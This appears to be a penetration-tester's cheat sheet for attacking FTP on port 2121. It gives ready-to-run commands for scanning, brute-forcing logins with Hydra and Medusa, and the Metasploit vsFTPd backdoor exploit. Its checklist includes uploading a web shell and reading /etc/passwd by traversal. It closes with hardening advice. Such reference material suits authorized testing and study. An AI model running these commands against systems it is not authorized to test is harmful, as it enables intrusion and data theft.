# FTP ALTERNATIVE PORT ENUMERATION (Port 2121/TCP)

## SERVICE OVERVIEW
```
FTP on alternative port 2121/TCP
- Non-standard FTP port (standard is 21)
- Often used to avoid detection or bypass firewalls
- Same protocol as port 21
- May indicate security through obscurity approach
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p2121 <IP>                            # Service/Version detection
nc -nv <IP> 2121                                # Manual connection
telnet <IP> 2121                                # Alternative connection
```

## NMAP ENUMERATION
```bash
# Use standard FTP scripts on port 2121
nmap -p2121 --script ftp-* <IP>                 # All FTP scripts
nmap -p2121 --script ftp-anon <IP>              # Anonymous login
nmap -p2121 --script ftp-bounce <IP>            # FTP bounce attack
nmap -p2121 --script ftp-brute <IP>             # Brute force
nmap -p2121 --script ftp-syst <IP>              # System info
nmap -p2121 --script ftp-vsftpd-backdoor <IP>   # vsFTPd backdoor (CVE-2011-2523)

# Comprehensive scan
nmap -sV -p2121 --script "ftp-* and not ftp-brute" <IP> -oA ftp_alt_scan
```

## ANONYMOUS LOGIN TESTING
```bash
# Test anonymous access
ftp <IP> 2121
> anonymous
> anonymous@example.com

# Via nmap
nmap -p2121 --script ftp-anon <IP>

# Via CLI
ftp -n <IP> 2121 <<EOF
user anonymous anonymous
ls
bye
EOF
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l admin -P passwords.txt ftp://<IP>:2121
hydra -L users.txt -P passwords.txt ftp://<IP>:2121

# Nmap
nmap -p2121 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Medusa
medusa -h <IP> -n 2121 -u admin -P passwords.txt -M ftp
```

## MANUAL FTP COMMANDS
```bash
# Connect
ftp <IP> 2121

# Common commands
USER <username>                                 # Specify username
PASS <password>                                 # Specify password
SYST                                            # System information
STAT                                            # Status
PWD                                             # Print working directory
LIST                                            # List files
RETR <file>                                     # Download file
STOR <file>                                     # Upload file
DELE <file>                                     # Delete file
MKD <dir>                                       # Make directory
RMD <dir>                                       # Remove directory
QUIT                                            # Disconnect
```

## DOWNLOAD/UPLOAD FILES
```bash
# Download files
wget ftp://<IP>:2121/file.txt --user=<user> --password=<pass>
wget -r ftp://<IP>:2121/ --user=<user> --password=<pass>  # Recursive

# Upload files
curl -T file.txt ftp://<IP>:2121/ --user <user>:<pass>

# Via FTP client
ftp <IP> 2121
> get file.txt                                  # Download
> put shell.php                                 # Upload
> mget *                                        # Download all
> mput *                                        # Upload all
```

## VULNERABILITY SCANNING
```bash
# vsFTPd 2.3.4 backdoor (port 2121 may hide this)
nmap -p2121 --script ftp-vsftpd-backdoor <IP>

# ProFTPd vulnerabilities
searchsploit proftpd

# Generic FTP exploits
searchsploit ftp

# Metasploit scanner
msfconsole -q -x "use auxiliary/scanner/ftp/ftp_version; set RHOSTS <IP>; set RPORT 2121; run"
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/ftp/ftp_version           # Version detection
use auxiliary/scanner/ftp/ftp_login             # Login scanner
use auxiliary/scanner/ftp/anonymous             # Anonymous login check
use exploit/unix/ftp/vsftpd_234_backdoor        # vsFTPd backdoor

set RHOSTS <IP>
set RPORT 2121
run
```

## COMMON MISCONFIGURATIONS
```
☐ Anonymous FTP access enabled
☐ FTP on non-standard port (weak obscurity)
☐ Writable directories accessible
☐ Weak credentials (admin:admin, ftp:ftp)
☐ Outdated FTP server with known exploits
☐ No TLS/SSL encryption (credentials in plaintext)
☐ Home directory access for anonymous users
☐ Web root writable via FTP (RCE via upload)
```

## QUICK WIN CHECKLIST
```
☐ Test anonymous login (user: anonymous)
☐ Brute force with common credentials
☐ Check for writable directories
☐ Upload web shell if web root is accessible
☐ Download interesting files (.conf, .bak, etc.)
☐ Check for vsFTPd 2.3.4 backdoor
☐ Test for directory traversal (../../etc/passwd)
☐ Search for version-specific exploits
```

## ONE-LINER ENUMERATION
```bash
# Quick FTP enumeration on port 2121
nmap -sV -p2121 --script "ftp-* and not ftp-brute" <IP>

# Test anonymous access
echo -e "USER anonymous\nPASS anonymous\nLIST\nQUIT" | nc -nv <IP> 2121
```

## SECURITY IMPLICATIONS
```
RISKS:
- Running FTP on alternative port doesn't improve security
- Security through obscurity is ineffective
- Same vulnerabilities as standard FTP port
- Plaintext credentials (if not using FTPS)
- Data transfer in cleartext
- Anonymous access may expose sensitive files

RECOMMENDATIONS:
- Use SFTP (SSH File Transfer Protocol) instead
- Use FTPS (FTP over SSL/TLS) at minimum
- Disable anonymous access
- Enforce strong authentication
- Restrict access to specific IPs
- Use standard ports (easier to manage/monitor)
- Regular security audits and updates
```

## REFERENCE STANDARD FTP (PORT 21)
```bash
# For detailed FTP enumeration techniques, see:
# SERVICE ENUM/21 FTP.md

# All techniques for port 21 apply to port 2121
# Simply specify the port: -p 2121 or -P 2121
```
